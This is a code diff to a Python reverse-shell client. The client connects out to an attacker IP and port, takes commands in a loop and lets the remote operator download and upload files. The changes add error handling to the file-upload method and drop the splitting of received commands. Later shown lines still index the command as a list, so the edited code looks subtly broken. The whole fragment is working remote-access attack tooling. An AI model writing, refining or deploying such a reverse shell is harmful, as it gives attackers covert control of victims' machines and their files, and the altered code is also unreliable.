@@ -23,10 +23,16 @@ class ReverseShell:
             return f"[-] file not found: {path}"
         except Exception as e:
             return f"[-] Error reading file: {e}"
-    def write_file(self,path,content):
-        with open(path,'wb')as file:
-            file.write(base64.b64decode(content))
-        return "[+] Uploaded successfully"
+
+    def write_file(self, path, content):
+        try:
+            decoded_content = base64.b64decode(content)
+            with open(path, 'wb') as file:
+                file.write(decoded_content)
+            return "[+] Uploaded successfully"
+        except Exception as e:
+            return f"[-] Error writing file: {e}"
+
     def sending_data(self,data):
         if isinstance(data,bytes):
             data =base64.b64encode(data).decode(self.format)
@@ -47,7 +53,7 @@ class ReverseShell:
         try:
             self.sock.connect((self.attacker_ip, self.attacker_port))
             while True:
-                command = self.receiving_data().split()
+                command = self.receiving_data()
                 if command in ["exit", "quit"]:
                     self.sock.close()
                     exit()
@@ -76,7 +82,6 @@ class ReverseShell:
                     output = self.read_file(command[1])
                 else:
                     output = "Error: No file specified for download."
-
 
             elif command[0] == "upload":
                 if len(command) > 2:
